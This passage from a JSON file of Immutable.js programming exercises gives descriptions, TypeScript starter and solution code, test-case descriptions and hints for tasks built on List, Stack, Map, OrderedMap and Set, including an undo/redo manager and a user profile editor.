            "Initialize with empty array: `initializeCatalog([])` should return an empty `List`.",
            "Add multiple products: `addProduct` should correctly add new items to the end.",
            "Update existing product price: `updateProductPrice` should change the price of the correct item and return a new `List`.",
            "Update non-existent product: `updateProductPrice` for a non-existent ID should return the original `List` without modification.",
            "Remove existing product: `removeProduct` should remove the correct item and return a new `List`.",
            "Remove non-existent product: `removeProduct` for a non-existent ID should return the original `List` without modification.",
            "Verify immutability: Ensure that the `initialCatalog` object remains unchanged after all subsequent operations.",
            "Conversion back to JS: `getJsCatalog` should correctly convert nested `Immutable.Map`s back to plain JS objects."
          ],
          "hints": [
            "Remember that `List()` and `Map()` constructors can take plain JavaScript arrays and objects, respectively, to initialize.",
            "For updating an element in a List based on a property (like `id`), you'll likely need `findIndex` followed by `update` or `set`.",
            "`delete(index)` is useful for removing an element at a specific position.",
            "The `.toJS()` method performs a deep conversion, which is exactly what you need for nested Immutable structures.",
            "Always return a new Immutable collection from your functions; never modify the input directly."
          ],
          "tags": [
            "Immutable.js",
            "List",
            "Map",
            "Data Management",
            "Immutability",
            "CRUD"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "theory_immutable_js_intro",
            "theory_immutable_list",
            "theory_immutable_map"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "State_management",
            "Functional_programming"
          ]
        },
        {
          "id": "task_immutable_stack_1",
          "title": "Implement an Undo/Redo Manager with Immutable.Stack",
          "description": "\nDesign and implement a simple undo/redo manager for a generic application state. The manager should use `Immutable.Stack` to keep track of past and future states.\n\n**Requirements:**\n1.  Create a class `UndoRedoManager` that can be initialized with an initial state.\n2.  Implement an `executeAction(newState)` method. This method should:\n    *   Push the *current* state onto an `undoStack`.\n    *   Set the `current state` to `newState`.\n    *   Clear the `redoStack` (as a new action invalidates future 'redo' possibilities).\n3.  Implement an `undo()` method. This method should:\n    *   Pop the `current state` and push it onto the `redoStack`.\n    *   Pop the last state from the `undoStack` and make it the `current state`.\n    *   Return the new `current state`.\n    *   Handle cases where `undoStack` is empty (no more undos).\n4.  Implement a `redo()` method. This method should:\n    *   Pop the `current state` and push it onto the `undoStack`.\n    *   Pop the last state from the `redoStack` and make it the `current state`.\n    *   Return the new `current state`.\n    *   Handle cases where `redoStack` is empty (no more redos).\n5.  Implement a `getCurrentState()` method to retrieve the current application state.\n\nUse `Immutable.js` collections (e.g., `Immutable.Stack`) for `undoStack` and `redoStack`. The states themselves can be simple numbers, strings, or even `Immutable.Map`s (though for this task, simpler types are fine).\n",
          "difficulty": "hard",
          "startingCode": "import { Stack, fromJS } from 'immutable';\n\nclass UndoRedoManager<T> {\n  private undoStack: Stack<T>;\n  private redoStack: Stack<T>;\n  private currentState: T;\n\n  constructor(initialState: T) {\n    this.currentState = initialState;\n    this.undoStack = Stack<T>();\n    this.redoStack = Stack<T>();\n  }\n\n  executeAction(newState: T): T {\n    // TODO: Implement this\n    return newState;\n  }\n\n  undo(): T {\n    // TODO: Implement this\n    return this.currentState;\n  }\n\n  redo(): T {\n    // TODO: Implement this\n    return this.currentState;\n  }\n\n  getCurrentState(): T {\n    return this.currentState;\n  }\n}\n\n// Example Usage:\nconst manager = new UndoRedoManager<string>('Initial State');\nconsole.log('Current:', manager.getCurrentState()); // Initial State\n\nmanager.executeAction('State A');\nconsole.log('Current:', manager.getCurrentState()); // State A\n\nmanager.executeAction('State B');\nconsole.log('Current:', manager.getCurrentState()); // State B\n\nmanager.executeAction('State C');\nconsole.log('Current:', manager.getCurrentState()); // State C\n\nmanager.undo();\nconsole.log('Undo 1:', manager.getCurrentState()); // State B\n\nmanager.undo();\nconsole.log('Undo 2:', manager.getCurrentState()); // State A\n\nmanager.redo();\nconsole.log('Redo 1:', manager.getCurrentState()); // State B\n\nmanager.executeAction('State D'); // New action, should clear redo stack\nconsole.log('Current:', manager.getCurrentState()); // State D\n\nmanager.redo(); // Should do nothing\nconsole.log('Redo after new action:', manager.getCurrentState()); // State D\n\nmanager.undo();\nconsole.log('Undo after new action:', manager.getCurrentState()); // State B\n",
          "solutionCode": "import { Stack, fromJS } from 'immutable';\n\nclass UndoRedoManager<T> {\n  private undoStack: Stack<T>;\n  private redoStack: Stack<T>;\n  private currentState: T;\n\n  constructor(initialState: T) {\n    this.currentState = initialState;\n    this.undoStack = Stack<T>();\n    this.redoStack = Stack<T>();\n  }\n\n  executeAction(newState: T): T {\n    // Push current state onto undo stack\n    this.undoStack = this.undoStack.push(this.currentState);\n    // Update current state\n    this.currentState = newState;\n    // Clear redo stack on new action\n    this.redoStack = Stack<T>();\n    return this.currentState;\n  }\n\n  undo(): T {\n    if (this.undoStack.isEmpty()) {\n      console.warn('Cannot undo: undo stack is empty.');\n      return this.currentState;\n    }\n    // Move current state to redo stack\n    this.redoStack = this.redoStack.push(this.currentState);\n    // Restore previous state from undo stack\n    this.currentState = this.undoStack.peek()!;\n    this.undoStack = this.undoStack.pop();\n    return this.currentState;\n  }\n\n  redo(): T {\n    if (this.redoStack.isEmpty()) {\n      console.warn('Cannot redo: redo stack is empty.');\n      return this.currentState;\n    }\n    // Move current state to undo stack\n    this.undoStack = this.undoStack.push(this.currentState);\n    // Restore next state from redo stack\n    this.currentState = this.redoStack.peek()!;\n    this.redoStack = this.redoStack.pop();\n    return this.currentState;\n  }\n\n  getCurrentState(): T {\n    return this.currentState;\n  }\n\n  // Optional: For debugging/testing\n  getUndoStackSize(): number {\n    return this.undoStack.size;\n  }\n  getRedoStackSize(): number {\n    return this.redoStack.size;\n  }\n}\n\n// Example Usage:\nconst manager = new UndoRedoManager<string>('Initial State');\nconsole.log('Current:', manager.getCurrentState(), 'Undo/Redo Sizes:', manager.getUndoStackSize(), manager.getRedoStackSize()); // Initial State 0 0\n\nmanager.executeAction('State A');\nconsole.log('Current:', manager.getCurrentState(), 'Undo/Redo Sizes:', manager.getUndoStackSize(), manager.getRedoStackSize()); // State A 1 0\n\nmanager.executeAction('State B');\nconsole.log('Current:', manager.getCurrentState(), 'Undo/Redo Sizes:', manager.getUndoStackSize(), manager.getRedoStackSize()); // State B 2 0\n\nmanager.executeAction('State C');\nconsole.log('Current:', manager.getCurrentState(), 'Undo/Redo Sizes:', manager.getUndoStackSize(), manager.getRedoStackSize()); // State C 3 0\n\nmanager.undo();\nconsole.log('Undo 1:', manager.getCurrentState(), 'Undo/Redo Sizes:', manager.getUndoStackSize(), manager.getRedoStackSize()); // State B 2 1\n\nmanager.undo();\nconsole.log('Undo 2:', manager.getCurrentState(), 'Undo/Redo Sizes:', manager.getUndoStackSize(), manager.getRedoStackSize()); // State A 1 2\n\nmanager.redo();\nconsole.log('Redo 1:', manager.getCurrentState(), 'Undo/Redo Sizes:', manager.getUndoStackSize(), manager.getRedoStackSize()); // State B 2 1\n\nmanager.executeAction('State D'); // New action, should clear redo stack\nconsole.log('Current:', manager.getCurrentState(), 'Undo/Redo Sizes:', manager.getUndoStackSize(), manager.getRedoStackSize()); // State D 3 0\n\nmanager.redo(); // Should do nothing\nconsole.log('Redo after new action:', manager.getCurrentState(), 'Undo/Redo Sizes:', manager.getUndoStackSize(), manager.getRedoStackSize()); // State D 3 0\n\nmanager.undo();\nconsole.log('Undo after new action:', manager.getCurrentState(), 'Undo/Redo Sizes:', manager.getUndoStackSize(), manager.getRedoStackSize()); // State B 2 1\n\nmanager.undo();\nmanager.undo();\nmanager.undo(); // Will warn\nconsole.log('After multiple undos:', manager.getCurrentState(), 'Undo/Redo Sizes:', manager.getUndoStackSize(), manager.getRedoStackSize()); // Initial State 0 3\n\nmanager.redo();\nmanager.redo();\nmanager.redo();\nmanager.redo(); // Will warn\nconsole.log('After multiple redos:', manager.getCurrentState(), 'Undo/Redo Sizes:', manager.getUndoStackSize(), manager.getRedoStackSize()); // State D 3 0\n",
          "testCases": [
            "Initial state: Manager should hold the initial state, stacks should be empty.",
            "Execute actions: `executeAction` should push current state to undo stack, update current state, and clear redo stack.",
            "Basic undo: Performing `undo` once should revert to the previous state, move current to redo, and get state from undo.",
            "Multiple undos: Test sequence of `executeAction` followed by multiple `undo` calls.",
            "Basic redo: After `undo`, performing `redo` should revert to the state before undo, move current to undo, and get state from redo.",
            "Multiple redos: Test sequence of `executeAction`, `undo`, `redo` calls.",
            "New action after undo: Verify `executeAction` correctly clears the redo stack if called after `undo` operations.",
            "Edge case: `undo` when `undoStack` is empty (should return current state and not error).",
            "Edge case: `redo` when `redoStack` is empty (should return current state and not error).",
            "Immutability: Ensure that states themselves (if they were Immutable.js structures) are not modified directly, but new instances are passed."
          ],
          "hints": [
            "Remember the LIFO principle of stacks: `push()` adds to the 'top', `pop()` removes from the 'top', and `peek()` inspects the 'top' without removing.",
            "When an action is executed, the `current state` effectively becomes the 'past' state for a potential undo, so it needs to be pushed onto the `undoStack` *before* the `current state` is updated.",
            "A new action (`executeAction`) invalidates any 'future' states that were in the `redoStack`, so `redoStack` should be reset (made empty) when `executeAction` is called.",
            "Handle empty stack conditions (`isEmpty()` method) to prevent errors when trying to pop from an empty stack.",
            "Use `Immutable.Stack.peek()` to get the top element without removing it, if needed, before `pop()`."
          ],
          "tags": [
            "Immutable.js",
            "Stack",
            "Design Pattern",
            "Undo/Redo",
            "State Management",
            "Data Structures"
          ],
          "timeEstimate": 90,
          "prerequisites": [
            "theory_immutable_stack"
          ],
          "complexity": 9,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "relatedConcepts": [
            "LIFO",
            "State_history",
            "Command_pattern"
          ]
        },
        {
          "id": "task_immutable_map_1",
          "title": "Build a User Profile Editor with Immutable.Map",
          "description": "\nCreate a `UserProfile` class that manages user data using `Immutable.Map`. The class should demonstrate immutable updates to user details, including nested preferences.\n\n**Requirements:**\n1.  **Constructor:** Initialize the `UserProfile` with basic user data (e.g., `id`, `name`, `email`) as an `Immutable.Map`.\n2.  **`updateField(key, value)`:** A method to update a top-level field (e.g., `name`, `email`). It should return a *new* `UserProfile` instance with the updated data. The original instance must remain unchanged.\n3.  **`updatePreference(key, value)`:** A method to update a nested preference within a 'preferences' `Immutable.Map` (if it exists, otherwise create it). This also needs to return a new `UserProfile` instance with immutable updates. For example, if the user has `preferences: Map({ theme: 'dark' })`, `updatePreference('notifications', true)` should result in `preferences: Map({ theme: 'dark', notifications: true })`.\n4.  **`getProfile()`:** A method to return the current user profile as a plain JavaScript object (deeply converted).\n5.  **`isEqual(otherProfile)`:** A method to compare two `UserProfile` instances efficiently, leveraging Immutable.js's equality checks.\n",
          "difficulty": "medium",
          "startingCode": "import { Map, is } from 'immutable';\n\ninterface UserData {\n  id: string;\n  name: string;\n  email: string;\n  preferences?: { [key: string]: any };\n}\n\nclass UserProfile {\n  private readonly data: Map<string, any>;\n\n  constructor(initialData: UserData) {\n    // TODO: Initialize data Map, convert nested preferences if present\n    this.data = Map();\n  }\n\n  updateField(key: string, value: any): UserProfile {\n    // TODO: Implement this to return a new UserProfile instance\n    return this;\n  }\n\n  updatePreference(key: string, value: any): UserProfile {\n    // TODO: Implement this for nested preferences, return new UserProfile instance\n    return this;\n  }\n\n  getProfile(): UserData {\n    // TODO: Implement this to return a plain JS object\n    return {} as UserData;\n  }\n\n  isEqual(otherProfile: UserProfile): boolean {\n    // TODO: Implement efficient equality check\n    return false;\n  }\n}\n\n// Example Usage:\nconst initialUserData: UserData = {\n  id: 'u1',\n  name: 'John Doe',\n  email: 'john.doe@example.com',\n  preferences: { theme: 'dark', newsletter: true }\n};\n\nconst user1 = new UserProfile(initialUserData);\nconsole.log('User1 Initial:', user1.getProfile());\n\nconst user2 = user1.updateField('email', 'john.d@newdomain.com');\nconsole.log('User2 after email update:', user2.getProfile());\nconsole.log('User1 (original) after email update:', user1.getProfile()); // Should be unchanged\n\nconst user3 = user2.updatePreference('theme', 'light');\nconsole.log('User3 after theme update:', user3.getProfile());\nconsole.log('User2 (original) after theme update:', user2.getProfile()); // Should be unchanged\n\nconst user4 = user3.updatePreference('notifications', false); // Add new preference\nconsole.log('User4 after add preference:', user4.getProfile());\n\nconsole.log('Is user1 equal to user2?', user1.isEqual(user2)); // Should be false\nconsole.log('Is user2 equal to user3?', user2.isEqual(user3)); // Should be false\nconsole.log('Is user1 equal to user1 (itself)?', user1.isEqual(user1)); // Should be true\n",
          "solutionCode": "import { Map, is, fromJS } from 'immutable';\n\ninterface UserData {\n  id: string;\n  name: string;\n  email: string;\n  preferences?: { [key: string]: any };\n}\n\nclass UserProfile {\n  private readonly data: Map<string, any>;\n\n  constructor(initialData: UserData) {\n    // Use fromJS for deep conversion of initial data, including nested objects/arrays\n    this.data = fromJS(initialData) as Map<string, any>;\n  }\n\n  // Method to update a top-level field\n  updateField(key: string, value: any): UserProfile {\n    const newData = this.data.set(key, value);\n    // Return a new UserProfile instance wrapping the new Immutable Map\n    return new UserProfile(newData.toJS() as UserData); // Re-initialize to ensure proper type inference and instance creation\n  }\n\n  // Method to update a nested preference\n  updatePreference(key: string, value: any): UserProfile {\n    // Use updateIn for nested immutable updates, ensuring preferences map exists\n    const newData = this.data.updateIn(\n      ['preferences', key],\n      val => value // This will set the value if key exists or add if not\n    );\n    // Return a new UserProfile instance\n    return new UserProfile(newData.toJS() as UserData);\n  }\n\n  // Method to return the current user profile as a plain JavaScript object\n  getProfile(): UserData {\n    return this.data.toJS() as UserData;\n  }\n\n  // Method to compare two UserProfile instances efficiently using Immutable.is\n  isEqual(otherProfile: UserProfile): boolean {\n    return is(this.data, otherProfile.data);\n  }\n}\n\n// Example Usage:\nconst initialUserData: UserData = {\n  id: 'u1',\n  name: 'John Doe',\n  email: 'john.doe@example.com',\n  preferences: { theme: 'dark', newsletter: true }\n};\n\nconst user1 = new UserProfile(initialUserData);\nconsole.log('User1 Initial:', user1.getProfile());\n\nconst user2 = user1.updateField('email', 'john.d@newdomain.com');\nconsole.log('User2 after email update:', user2.getProfile());\nconsole.log('User1 (original) after email update:', user1.getProfile()); // Should be unchanged\n\nconst user3 = user2.updatePreference('theme', 'light');\nconsole.log('User3 after theme update:', user3.getProfile());\nconsole.log('User2 (original) after theme update:', user2.getProfile()); // Should be unchanged\n\nconst user4 = user3.updatePreference('notifications', false); // Add new preference\nconsole.log('User4 after add preference:', user4.getProfile());\n\nconsole.log('Is user1 equal to user2?', user1.isEqual(user2)); // Should be false\nconsole.log('Is user2 equal to user3?', user2.isEqual(user3)); // Should be false\nconsole.log('Is user1 equal to user1 (itself)?', user1.isEqual(user1)); // Should be true\n\n// Test edge cases\nconst user5 = new UserProfile({ id: 'u5', name: 'No Prefs', email: 'no@example.com' });\nconsole.log('User5 (no prefs):', user5.getProfile());\nconst user6 = user5.updatePreference('lang', 'en'); // Add preference to a user with no initial preferences\nconsole.log('User6 (added pref to no-pref user):', user6.getProfile()); // Should have { lang: 'en' }\n\nconst user7 = user6.updateField('name', 'No Prefs Updated'); // Update top level field on user with preferences\nconsole.log('User7 (updated field on user with prefs):', user7.getProfile());\n\nconsole.log('Is user5 equal to user6?', user5.isEqual(user6)); // Should be false\nconsole.log('Is user6 equal to user7?', user6.isEqual(user7)); // Should be false\n\nconst user8 = user7.updateField('name', 'No Prefs Updated'); // Update with same value\nconsole.log('Is user7 equal to user8 (same value update)?', user7.isEqual(user8)); // Should be true due to Immutable.js optimization\n",
          "testCases": [
            "Constructor: Initialize with and without a `preferences` object.",
            "Update top-level field: Change `name` or `email`, verify new `UserProfile` instance is returned and original is unchanged.",
            "Update existing preference: Change `theme` from 'dark' to 'light', verify new instance and correct nested update.",
            "Add new preference: Add `notifications` to a user profile, verify it's correctly nested and a new instance is returned.",
            "Add preference to user without initial `preferences` object: Verify `preferences` Map is created correctly.",
            "Convert to JS: `getProfile()` should return a plain JS object, with nested objects also converted.",
            "Equality check: `isEqual` should return `true` for identical profiles (same underlying Immutable.Map) and `false` for different ones.",
            "Equality for identical update: If `updateField` or `updatePreference` is called with the *same value* as currently stored, `isEqual` between the old and new instances should still be `true` (due to Immutable.js optimization returning the same instance if no effective change).",
            "Chained updates: Perform several updates in sequence and verify the final state and that all intermediate objects are distinct."
          ],
          "hints": [
            "Use `Immutable.fromJS()` in the constructor to convert the initial plain JavaScript object (and any nested objects/arrays) into Immutable.js collections automatically.",
            "For `updateField`, the `Map.set()` method is your friend. Remember it returns a new Map.",
            "For `updatePreference`, you'll need to update a nested value. `Map.updateIn(['preferences', key], updaterFunction)` or `Map.setIn(['preferences', key], value)` are suitable. `updateIn` is more robust if `preferences` might initially be missing or `undefined`.",
            "When returning a `UserProfile` instance from `updateField` or `updatePreference`, make sure you create a *new* `UserProfile` instance using the *new* `Immutable.Map` that was returned by `set` or `updateIn`.",
            "For `isEqual`, Immutable.js provides a utility function `Immutable.is()` which performs a deep equality check on Immutable.js collections efficiently."
          ],
          "tags": [
            "Immutable.js",
            "Map",
            "Class Design",
            "State Management",
            "Nested Data",
            "Immutability"
          ],
          "timeEstimate": 75,
          "prerequisites": [
            "theory_immutable_map",
            "theory_immutable_js_intro"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "relatedConcepts": [
            "Deep_updates",
            "Referential_equality",
            "Data_modeling"
          ]
        },
        {
          "id": "task_immutable_orderedmap_1",
          "title": "Develop a Dynamic Configuration Manager with OrderedMap",
          "description": "\nImplement a `ConfigManager` class using `Immutable.OrderedMap` to handle application configurations where the order of configuration keys is important (e.g., for UI display or processing pipelines).\n\n**Requirements:**\n1.  **Constructor:** Initialize `ConfigManager` with an `Immutable.OrderedMap` or convert a plain JS object to it, preserving order.\n2.  **`addConfig(key, value)`:** Add a new configuration entry. If the key already exists, update its value but *maintain its original position*. Return a new `ConfigManager` instance.\n3.  **`removeConfig(key)`:** Remove a configuration entry. Return a new `ConfigManager` instance.\n4.  **`getOrderedKeys()`:** Return a plain JavaScript array of all configuration keys, ensuring they are in their insertion order.\n5.  **`getConfig(key)`:** Retrieve the value for a given key.\n6.  **`toPlainObject()`:** Convert the entire configuration to a plain JavaScript object, preserving the insertion order of keys (this means iterating the `OrderedMap` and building the object). Note that `toJS()` might not guarantee order for plain JS objects in older environments, so explicit iteration is safer for strict order preservation in plain objects.\n",
          "difficulty": "medium",
          "startingCode": "import { OrderedMap } from 'immutable';\n\nclass ConfigManager {\n  private readonly config: OrderedMap<string, any>;\n\n  constructor(initialConfig?: { [key: string]: any }) {\n    // TODO: Initialize config as OrderedMap, preserving order if initialConfig is provided\n    this.config = OrderedMap();\n  }\n\n  addConfig(key: string, value: any): ConfigManager {\n    // TODO: Add/update config, preserve original insertion order for existing keys\n    return this;\n  }\n\n  removeConfig(key: string): ConfigManager {\n    // TODO: Remove config\n    return this;\n  }\n\n  getOrderedKeys(): string[] {\n    // TODO: Return keys in insertion order\n    return [];\n  }\n\n  getConfig(key: string): any | undefined {\n    // TODO: Get config value\n    return undefined;\n  }\n\n  toPlainObject(): { [key: string]: any } {\n    // TODO: Convert to plain JS object, preserving order\n    return {};\n  }\n}\n\n// Example Usage:\nconst manager = new ConfigManager({ setting1: 'value1', setting2: 123 });\nconsole.log('Initial Config Keys:', manager.getOrderedKeys()); // ['setting1', 'setting2']\nconsole.log('Initial Config Object:', manager.toPlainObject());\n\nconst manager2 = manager.addConfig('setting3', true);\nconsole.log('Config2 Keys (add new):', manager2.getOrderedKeys()); // ['setting1', 'setting2', 'setting3']\n\nconst manager3 = manager2.addConfig('setting1', 'updatedValue'); // Update existing key\nconsole.log('Config3 Keys (update existing):', manager3.getOrderedKeys()); // ['setting1', 'setting2', 'setting3']\nconsole.log('Config3 Object:', manager3.toPlainObject()); // setting1 should be 'updatedValue'\n\nconst manager4 = manager3.removeConfig('setting2');\nconsole.log('Config4 Keys (remove):', manager4.getOrderedKeys()); // ['setting1', 'setting3']\nconsole.log('Config4 Object:', manager4.toPlainObject()); // setting2 should be gone\n\nconsole.log('Original manager keys:', manager.getOrderedKeys()); // Should be unchanged: ['setting1', 'setting2']\n",
          "solutionCode": "import { OrderedMap, fromJS } from 'immutable';\n\nclass ConfigManager {\n  private readonly config: OrderedMap<string, any>;\n\n  constructor(initialConfig?: { [key: string]: any }) {\n    // Use fromJS to convert initial plain JS object, if provided. \n    // OrderedMap constructor can also take a JS object directly.\n    this.config = initialConfig ? OrderedMap(initialConfig) : OrderedMap();\n  }\n\n  addConfig(key: string, value: any): ConfigManager {\n    // OrderedMap.set automatically preserves order if key exists, otherwise adds to end\n    const newConfig = this.config.set(key, value);\n    return new ConfigManager(newConfig.toJS()); // Re-wrap new Immutable.OrderedMap\n  }\n\n  removeConfig(key: string): ConfigManager {\n    const newConfig = this.config.delete(key);\n    return new ConfigManager(newConfig.toJS()); // Re-wrap new Immutable.OrderedMap\n  }\n\n  getOrderedKeys(): string[] {\n    // OrderedMap.keys() returns an Iterator; convert to array\n    return this.config.keySeq().toArray();\n  }\n\n  getConfig(key: string): any | undefined {\n    return this.config.get(key);\n  }\n\n  toPlainObject(): { [key: string]: any } {\n    // OrderedMap.toJS() preserves order when converting to plain JS object\n    return this.config.toJS();\n  }\n}\n\n// Example Usage:\nconst manager = new ConfigManager({ setting1: 'value1', setting2: 123 });\nconsole.log('Initial Config Keys:', manager.getOrderedKeys()); // ['setting1', 'setting2']\nconsole.log('Initial Config Object:', manager.toPlainObject()); // { setting1: 'value1', setting2: 123 }\n\nconst manager2 = manager.addConfig('setting3', true);\nconsole.log('Config2 Keys (add new):', manager2.getOrderedKeys()); // ['setting1', 'setting2', 'setting3']\nconsole.log('Config2 Object:', manager2.toPlainObject()); // { setting1: 'value1', setting2: 123, setting3: true }\n\nconst manager3 = manager2.addConfig('setting1', 'updatedValue'); // Update existing key\nconsole.log('Config3 Keys (update existing):', manager3.getOrderedKeys()); // ['setting1', 'setting2', 'setting3']\nconsole.log('Config3 Object:', manager3.toPlainObject()); // { setting1: 'updatedValue', setting2: 123, setting3: true }\n\nconst manager4 = manager3.removeConfig('setting2');\nconsole.log('Config4 Keys (remove):', manager4.getOrderedKeys()); // ['setting1', 'setting3']\nconsole.log('Config4 Object:', manager4.toPlainObject()); // { setting1: 'updatedValue', setting3: true }\n\nconsole.log('Original manager keys (unchanged):', manager.getOrderedKeys()); // ['setting1', 'setting2']\nconsole.log('Original manager object (unchanged):', manager.toPlainObject()); // { setting1: 'value1', setting2: 123 }\n\n// Test with an empty initial config\nconst emptyManager = new ConfigManager();\nconsole.log('Empty Manager Keys:', emptyManager.getOrderedKeys()); // []\nconst managerWithOne = emptyManager.addConfig('first', 1);\nconsole.log('Manager with one Key:', managerWithOne.getOrderedKeys()); // ['first']\n\n// Test with complex values\nconst complexManager = new ConfigManager();\nconst complex1 = complexManager.addConfig('nestedMap', fromJS({ a: 1, b: { c: 2 } }));\nconst complex2 = complex1.addConfig('nestedList', fromJS([1, 2, 3]));\nconsole.log('Complex Manager Keys:', complex2.getOrderedKeys());\nconsole.log('Complex Manager Object:', complex2.toPlainObject());\n",
          "testCases": [
            "Initial config: `ConfigManager({})` should result in an empty `OrderedMap`. `getOrderedKeys()` should return `[]`.",
            "Initial config with data: `ConfigManager({a: 1, b: 2})` should correctly initialize, and `getOrderedKeys()` should return `['a', 'b']`.",
            "Add new config: `addConfig('c', 3)` should add 'c' to the end of the order.",
            "Update existing config: `addConfig('a', 10)` should update the value of 'a' but its position in `getOrderedKeys()` should remain the same as its initial insertion.",
            "Remove config: `removeConfig('b')` should remove 'b' and return a new `ConfigManager` without it.",
            "Attempt to remove non-existent config: Should return a new `ConfigManager` that is identical to the original (or the same instance for optimization).",
            "Get config value: `getConfig('a')` should return the correct value.",
            "Convert to plain object: `toPlainObject()` should return a plain JavaScript object where keys are in their original insertion order.",
            "Immutability: Verify that the original `ConfigManager` instance remains unchanged after any modification operations."
          ],
          "hints": [
            "The `OrderedMap` constructor can directly take a plain JavaScript object, and it will preserve the order of keys from that object.",
            "The `set()` method of `OrderedMap` automatically handles both adding new keys (at the end) and updating existing keys (preserving their position).",
            "To get ordered keys as a plain array, you can use `this.config.keySeq().toArray()`.",
            "The `OrderedMap.toJS()` method is designed to convert to a plain JavaScript object *while preserving insertion order*, which simplifies the `toPlainObject()` method.",
            "Remember to always return a *new* `ConfigManager` instance wrapping the *new* `OrderedMap` that results from any modification."
          ],
          "tags": [
            "Immutable.js",
            "OrderedMap",
            "Configuration Management",
            "Order Preservation",
            "Immutability"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "theory_immutable_orderedmap",
            "theory_immutable_map"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "Dynamic_forms",
            "UI_rendering_order",
            "Data_serialization"
          ]
        },
        {
          "id": "task_immutable_set_1",
          "title": "Manage Unique User Tags with Immutable.Set",
          "description": "\nDevelop a `UserTagManager` class that uses `Immutable.Set` to efficiently manage a user's unique tags. The manager should support adding tags, removing tags, checking for tag existence, and performing set operations like finding common tags with another user.\n\n**Requirements:**\n1.  **Constructor:** Initialize the `UserTagManager` with an initial array of tags (e.g., `['frontend', 'javascript']`). Ensure duplicates are handled correctly by `Immutable.Set`.\n2.  **`addTag(tag)`:** Add a new tag to the user's collection. If the tag already exists, the set should remain unchanged (and return the same instance). Return a new `UserTagManager` instance.\n3.  **`removeTag(tag)`:** Remove a tag from the collection. Return a new `UserTagManager` instance.\n4.  **`hasTag(tag)`:** Check if a tag exists in the collection. Return `boolean`.\n5.  **`getTags()`:** Return all tags as a plain JavaScript array.\n6.  **`getCommonTags(otherTagManager)`:** A static method that takes two `UserTagManager` instances and returns a plain JavaScript array of tags that are present in both users' collections (intersection).\n",
          "difficulty": "medium",
          "startingCode": "import { Set } from 'immutable';\n\nclass UserTagManager {\n  private readonly tags: Set<string>;\n\n  constructor(initialTags: string[] = []) {\n    // TODO: Initialize tags Set, handle duplicates\n    this.tags = Set();\n  }\n\n  addTag(tag: string): UserTagManager {\n    // TODO: Add tag, return new instance\n    return this;\n  }\n\n  removeTag(tag: string): UserTagManager {\n    // TODO: Remove tag, return new instance\n    return this;\n  }\n\n  hasTag(tag: string): boolean {\n    // TODO: Check if tag exists\n    return false;\n  }\n\n  getTags(): string[] {\n    // TODO: Return tags as plain array\n    return [];\n  }\n\n  static getCommonTags(manager1: UserTagManager, manager2: UserTagManager): string[] {\n    // TODO: Implement common tags logic (intersection)\n    return [];\n  }\n}\n\n// Example Usage:\nconst user1Tags = new UserTagManager(['react', 'redux', 'javascript']);\nconsole.log('User1 Tags:', user1Tags.getTags()); // ['react', 'redux', 'javascript'] (order not guaranteed)\n\nconst user2Tags = user1Tags.addTag('typescript');\nconsole.log('User2 Tags (add):', user2Tags.getTags()); // Should include 'typescript'\n\nconst user3Tags = user2Tags.addTag('react'); // Adding duplicate\nconsole.log('User3 Tags (add duplicate - should be same as User2):', user3Tags.getTags());\n\nconst user4Tags = user3Tags.removeTag('redux');\nconsole.log('User4 Tags (remove):', user4Tags.getTags()); // Should not include 'redux'\n\nconsole.log('User1 has react?', user1Tags.hasTag('react')); // true\nconsole.log('User4 has redux?', user4Tags.hasTag('redux')); // false\n\nconst anotherUserTags = new UserTagManager(['angular', 'typescript', 'css']);\nconsole.log('Common tags between User4 and anotherUserTags:', UserTagManager.getCommonTags(user4Tags, anotherUserTags)); // Should be ['typescript']\n",
          "solutionCode": "import { Set } from 'immutable';\n\nclass UserTagManager {\n  private readonly tags: Set<string>;\n\n  constructor(initialTags: string[] = []) {\n    this.tags = Set(initialTags);\n  }\n\n  addTag(tag: string): UserTagManager {\n    const newTags = this.tags.add(tag);\n    // Immutable.js returns the same instance if no change, so we can always create a new manager\n    return new UserTagManager(newTags.toJS());\n  }\n\n  removeTag(tag: string): UserTagManager {\n    const newTags = this.tags.delete(tag);\n    return new UserTagManager(newTags.toJS());\n  }\n\n  hasTag(tag: string): boolean {\n    return this.tags.has(tag);\n  }\n\n  getTags(): string[] {\n    return this.tags.toJS(); // .toArray() also works\n  }\n\n  static getCommonTags(manager1: UserTagManager, manager2: UserTagManager): string[] {\n    const commonSet = manager1.tags.intersect(manager2.tags);\n    return commonSet.toJS();\n  }\n}\n\n// Example Usage:\nconst user1Tags = new UserTagManager(['react', 'redux', 'javascript', 'typescript']);\nconsole.log('User1 Tags:', user1Tags.getTags());\n\nconst user2Tags = user1Tags.addTag('graphql');\nconsole.log('User2 Tags (add graphql):', user2Tags.getTags());\n\nconst user3Tags = user2Tags.addTag('react'); // Adding duplicate 'react'\nconsole.log('User3 Tags (add duplicate - should be same as User2):', user3Tags.getTags());\n\nconst user4Tags = user3Tags.removeTag('redux');\nconsole.log('User4 Tags (remove redux):', user4Tags.getTags());\n\nconsole.log('User1 has react?', user1Tags.hasTag('react')); // true\nconsole.log('User4 has redux?', user4Tags.hasTag('redux')); // false\nconsole.log('User4 has graphql?', user4Tags.hasTag('graphql')); // true\n\nconst anotherUserTags = new UserTagManager(['angular', 'typescript', 'css', 'graphql']);\nconsole.log('Another User Tags:', anotherUserTags.getTags());\nconsole.log('Common tags between User4 and anotherUserTags:', UserTagManager.getCommonTags(user4Tags, anotherUserTags)); // ['graphql', 'typescript'] (order not guaranteed)\n\n// Edge cases:\nconst emptyTags = new UserTagManager();\nconsole.log('Empty Tags:', emptyTags.getTags()); // []\nconst addedToEmpty = emptyTags.addTag('first');\nconsole.log('Added to empty:', addedToEmpty.getTags()); // ['first']\nconst removedFromEmpty = emptyTags.removeTag('non-existent');\nconsole.log('Removed from empty (should be same):', removedFromEmpty.getTags()); // []\n\nconst finalRemoved = addedToEmpty.removeTag('first');\nconsole.log('Removed last tag:', finalRemoved.getTags()); // []\n\nconst originalUser1Tags = new UserTagManager(['react', 'redux', 'javascript', 'typescript']);\nconsole.log('Original user1Tags still intact:', originalUser1Tags.getTags()); // Verify immutability\n",
          "testCases": [
